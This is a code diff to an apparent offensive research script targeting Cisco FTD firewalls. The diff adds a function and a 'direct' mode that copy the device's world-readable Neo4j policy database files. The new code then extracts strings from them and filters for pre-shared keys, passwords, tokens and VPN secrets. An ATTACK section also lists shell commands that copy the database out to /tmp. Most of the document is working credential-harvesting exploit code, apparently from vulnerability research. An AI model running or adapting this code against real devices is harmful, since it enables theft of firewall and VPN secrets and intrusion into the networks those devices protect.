@@ -53,10 +53,12 @@ ATTACK:
     nc -z 127.0.0.1 7687 && echo "bolt open"
     # If open: cypher-shell or direct bolt queries
 
-  Option 3: Read database files directly (root required, or via F-FTD-86)
-    find /ngfw -name "neostore*" -o -name "*.db" 2>/dev/null
-    # Typical path: /ngfw/var/cisco/ngfwdb/ or /var/lib/neo4j/
-    # With root (F-FTD-85): copy raw Neo4j store files
+  Option 3: Read database files directly (CONFIRMED on FTD 7.0.0-94)
+    # DB at /ngfw/var/lib/db/ngfw.db/ — ALL files world-readable (-rw-r--r--)
+    # Admin shell (uid=100) can read without sudo — NO root required
+    strings /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings
+    cp -r /ngfw/var/lib/db/ngfw.db/ /tmp/neo4j-exfil/
+    # Then parse offline with local Neo4j 3.4 instance
 
   Option 4: Use neo4j-admin from command line if accessible
     neo4j-admin dump --database=graph.db --to=/tmp/fdm.dump
@@ -203,7 +205,10 @@ def pull_backup(output_dir="/tmp/fdm-neo4j-backup"):
 def find_neo4j_db_path():
     """Locate Neo4j database files on the filesystem. CONTROLLED ENVIRONMENT ONLY."""
     print(f"[*] F-FTD-96: Searching for Neo4j database files")
+    # Confirmed path on FTD 7.0.0-94 and 6.7.0-65:
+    CONFIRMED_PATH = "/ngfw/var/lib/db/ngfw.db"
     search_paths = [
+        CONFIRMED_PATH,
         "/ngfw/var/cisco/ngfwdb",
         "/ngfw/var/cisco/ngfw",
         "/var/lib/neo4j",
@@ -222,6 +227,99 @@ def find_neo4j_db_path():
             return base
     print(f"[-] Neo4j store files not found in expected paths")
     return None
+
+
+def direct_file_extract(db_path="/ngfw/var/lib/db/ngfw.db", output_dir="/tmp/fdm-neo4j-direct"):
+    """
+    Extract Neo4j policy DB via direct file copy (no backup protocol needed).
+
+    Confirmed on FTD 7.0.0-94 (2026-08-20):
+      - DB at /ngfw/var/lib/db/ngfw.db/ owned www:www
+      - All files -rw-r--r-- (world-readable) — admin shell can read without sudo
+      - Total ~23MB of policy data including 9.8MB transaction log
+
+    Files of interest:
+      neostore.propertystore.db.strings  — all string property values (PSKs, secrets)
+      neostore.propertystore.db.arrays   — array property values
+      neostore.nodestore.db              — node records
+      neostore.relationshipstore.db      — relationship records
+      neostore.labeltokenstore.db.names  — node type names
+      neostore.propertystore.db.index.keys — all property key names
+
+    Node labels confirmed: HAConfiguration, HAFailoverConfiguration,
+    SToSConnectionProfile, IkevOnePolicy, IkevTwoPolicy, RaVpnGroupPolicy,
+    SecurityZone, IdentityPolicy, AccessRule, NatRule, NetworkObject
+
+    Property keys confirmed: remotePeerIpAddress, tunnelId, vpnIdleTimeout,
+    enableDTLS, rekeyInterval, splitDNSDomainList, name, uuid, objId, status
+
+    CONTROLLED ENVIRONMENT ONLY.
+    """
+    print(f"[*] F-FTD-96: Direct file extraction from {db_path}")
+
+    import shutil
+
+    os.makedirs(output_dir, exist_ok=True)
+
+    # Copy all DB store files
+    result = subprocess.run(["find", db_path, "-name", "*.db", "-o", "-name", "neostore"],
+                            capture_output=True, text=True, timeout=15)
+    files = [f for f in result.stdout.strip().split('\n') if f]
+    print(f"    Found {len(files)} store files")
+
+    for fpath in files:
+        dst = os.path.join(output_dir, os.path.basename(fpath))
+        try:
+            shutil.copy2(fpath, dst)
+            sz = os.path.getsize(dst)
+            print(f"    Copied: {os.path.basename(fpath)} ({sz} bytes)")
+        except PermissionError:
+            print(f"    DENIED: {fpath} (not world-readable — need www or root)")
+        except Exception as e:
+            print(f"    Error: {fpath}: {e}")
+
+    # Extract string values immediately (no binary parsing needed)
+    print(f"\n[*] Extracting string property values (PSKs, secrets, config)")
+    strings_file = os.path.join(db_path, "neostore.propertystore.db.strings")
+    if os.path.exists(strings_file):
+        result = subprocess.run(["strings", strings_file], capture_output=True, text=True)
+        extracted = result.stdout.strip().split('\n')
+        # Filter for security-relevant strings
+        security_hits = [s for s in extracted if any(k in s.lower() for k in
+                         ['psk', 'secret', 'password', 'key', 'preshared', 'ha|', 'tunnel',
+                          'vpn', 'ipsec', 'ikev', 'admin', 'mgmt', 'token'])]
+        if security_hits:
+            print(f"[!!!] Security-relevant strings found in property store:")
+            for hit in security_hits[:30]:
+                print(f"    {hit}")
+        # Save all strings
+        out_strings = os.path.join(output_dir, "strings_extracted.txt")
+        with open(out_strings, 'w') as f:
+            f.write('\n'.join(extracted))
+        print(f"    All strings saved to {out_strings} ({len(extracted)} entries)")
+
+    # Label names (node types)
+    labels_file = os.path.join(db_path, "neostore.labeltokenstore.db.names")
+    if os.path.exists(labels_file):
+        result = subprocess.run(["strings", labels_file], capture_output=True, text=True)
+        print(f"\n[*] Node labels (object types in policy DB):")
+        for label in result.stdout.strip().split('\n'):
+            if label.strip():
+                print(f"    {label}")
+
+    # Property key names
+    keys_file = os.path.join(db_path, "neostore.propertystore.db.index.keys")
+    if os.path.exists(keys_file):
+        result = subprocess.run(["strings", keys_file], capture_output=True, text=True)
+        print(f"\n[*] Property keys (all attributes stored in policy DB):")
+        for key in result.stdout.strip().split('\n'):
+            if key.strip():
+                print(f"    {key}")
+
+    print(f"\n[*] Files copied to {output_dir}")
+    print(f"    Parse with neo4j-admin or offline Neo4j 3.4 instance:")
+    print(f"    neo4j-admin load --from={output_dir} --database=fdm --force")
+    return output_dir
 
 
 def bolt_cypher_query(query, host="127.0.0.1", port=NEO4J_BOLT_PORT):
@@ -328,6 +426,11 @@ if __name__ == "__main__":
 
     elif mode == "find":
         find_neo4j_db_path()
+
+    elif mode == "direct":
+        db_path = sys.argv[2] if len(sys.argv) > 2 else "/ngfw/var/lib/db/ngfw.db"
+        output_dir = sys.argv[3] if len(sys.argv) > 3 else "/tmp/fdm-neo4j-direct"
+        direct_file_extract(db_path, output_dir)
 
     elif mode == "psks":
         extract_vpn_psks()
